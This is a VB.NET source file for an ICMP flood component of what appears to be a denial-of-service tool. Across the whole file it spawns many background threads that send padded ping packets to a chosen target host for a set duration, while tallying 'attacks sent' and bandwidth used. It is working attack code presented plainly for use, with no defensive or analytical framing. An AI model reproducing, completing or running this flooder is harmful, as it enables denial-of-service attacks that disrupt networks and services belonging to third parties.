Imports System.Text
Imports System.Threading
Imports System.Net.NetworkInformation
Public Class ICMP
    Private _ThreadsEnded = 0
    Private HostToAttack As String
    Private TimetoAttack As Integer
    Private ThreadstoUse As Integer
    Private Threads As Thread()
    Private AttackRunning As Boolean = False
    Private Threadsto As Integer
    Private Length As Integer
    Private Timeout As Integer
    Public Sub New(ByVal model As ICMPModel)
        If Not AttackRunning = True Then
            AttackRunning = True
            HostToAttack = model.newBaseFloodModel.Host
            ThreadstoUse = model.newBaseFloodModel.ThreadstoUse
            TimetoAttack = model.newBaseFloodModel.Time
            Threadsto = model.newBaseFloodModel.ThreadstoUse
            Length = model.newIcmpVariables.Length
            Timeout = model.newIcmpVariables.Timeout
            Threads = New Thread(Threadsto - 1) {}
            GetFloodsBase().Reset()
            GetFloodsBase().SetMessage("ICMP Flood started!")
            For i As Integer = 0 To Threadsto - 1
                Threads(i) = New Thread(AddressOf DoWork)
                Threads(i).IsBackground = True
                Threads(i).Start()
            Next
        Else
            GetFloodsBase().SetMessage("A ICMP Attack is Already Running on " & HostToAttack)
        End If
    End Sub

    Private Sub Ended()
        _ThreadsEnded = _ThreadsEnded + 1
        If _ThreadsEnded = ThreadstoUse Then
            _ThreadsEnded = 0
            ThreadstoUse = 0
            AttackRunning = False
            GetFloodsBase().SetMessage("ICMP Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & GetFloodsBase.Get_AttackCount().ToString)
            'GetFloodsBase().SetEnd()
        End If
    End Sub

    Public Sub Stoped()
        If AttackRunning = True Then
            For i As Integer = 0 To ThreadstoUse - 1
                Try
                    Threads(i).Abort()
                Catch
                End Try
            Next
            AttackRunning = False
            GetFloodsBase().SetMessage("ICMP Attack on " & HostToAttack & " aborted successfully. Attacks Sent: " & GetFloodsBase.Get_AttackCount().ToString)

        Else
            GetFloodsBase().SetMessage("No Condis Attack is Running!")
        End If
    End Sub

    Private Sub DoWork()
        Try

            Dim span As TimeSpan = TimeSpan.FromSeconds(CDbl(TimetoAttack))
            Dim stopwatch As Stopwatch = Stopwatch.StartNew
            Dim count As Integer = 0

            Dim Data As String = "a"
            For i = 0 To Length
                Data += "a"
            Next
            Dim UploadLength As Integer = Data.Length
            Dim DownloadLength As Integer = UploadLength
            Do While (stopwatch.Elapsed < span)
                'FloodBase
                GetFloodsBase().Set_AttackCount(GetFloodsBase.Get_AttackCount() + count)
                GetFloodsBase().SetAttackUpStrengOnByte(GetFloodsBase.Get_AttackCount() * UploadLength)
                GetFloodsBase().SetAttackDownStrengOnByte(GetFloodsBase.Get_AttackCount() * DownloadLength)
                count += 1
                If Config.Variables.Debug Then
                    Console.WriteLine("Count: " & GetFloodsBase.Get_AttackCount() & "Download byte/s: " & GetFloodsBase.GetAttackDownStrengOnByteOnSec())
                End If

                'Worker
                Try
                    My.Computer.Network.Ping(HostToAttack)
                    Dim pingSender As Ping = New Ping()
                    Dim buffer As Byte() = Encoding.ASCII.GetBytes(Data)
                    Dim reply As PingReply = pingSender.Send(HostToAttack, Timeout, buffer)

                    Continue Do
                Catch
                    Continue Do
                End Try
            Loop
        Catch : End Try
        Ended()
    End Sub
End Class
